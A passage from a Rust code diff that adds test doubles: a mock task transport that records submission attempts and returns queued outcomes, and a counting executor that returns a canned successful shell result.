+                .unwrap_or_else(std::sync::PoisonError::into_inner)
+                .clone()
+        }
+
+        fn result_attempts(&self) -> Vec<TaskResult> {
+            self.result_attempts
+                .lock()
+                .unwrap_or_else(std::sync::PoisonError::into_inner)
+                .clone()
+        }
+    }
+
+    impl TaskTransport for MockTransport {
+        async fn submit_running(&self, task: &Task, started_at: &str) -> SubmissionOutcome {
+            self.running_attempts
+                .lock()
+                .unwrap_or_else(std::sync::PoisonError::into_inner)
+                .push((task.id.clone(), started_at.to_string()));
+            self.running_outcomes
+                .lock()
+                .unwrap_or_else(std::sync::PoisonError::into_inner)
+                .pop_front()
+                .unwrap_or(SubmissionOutcome::Accepted)
+        }
+
+        async fn submit_result(&self, result: &TaskResult) -> SubmissionOutcome {
+            self.result_attempts
+                .lock()
+                .unwrap_or_else(std::sync::PoisonError::into_inner)
+                .push(result.clone());
+            self.result_outcomes
+                .lock()
+                .unwrap_or_else(std::sync::PoisonError::into_inner)
+                .pop_front()
+                .unwrap_or(SubmissionOutcome::Accepted)
+        }
+    }
+
+    struct CountingExecutor {
+        count: AtomicUsize,
+        execution: ShellExecution,
+    }
+
+    impl CountingExecutor {
+        fn successful(stdout: &str) -> Self {
+            Self {
+                count: AtomicUsize::new(0),
+                execution: ShellExecution {
+                    stdout: stdout.to_string(),
+                    stderr: String::new(),
+                    exit_code: Some(0),
+                    error: None,
+                },
+            }
+        }
+
+        fn executions(&self) -> usize {
+            self.count.load(Ordering::SeqCst)
+        }
+    }
+
+    impl TaskExecutor for CountingExecutor {
+        async fn execute(&self, _task: &Task) -> ShellExecution {
+            self.count.fetch_add(1, Ordering::SeqCst);
+            self.execution.clone()
+        }
     }
 }
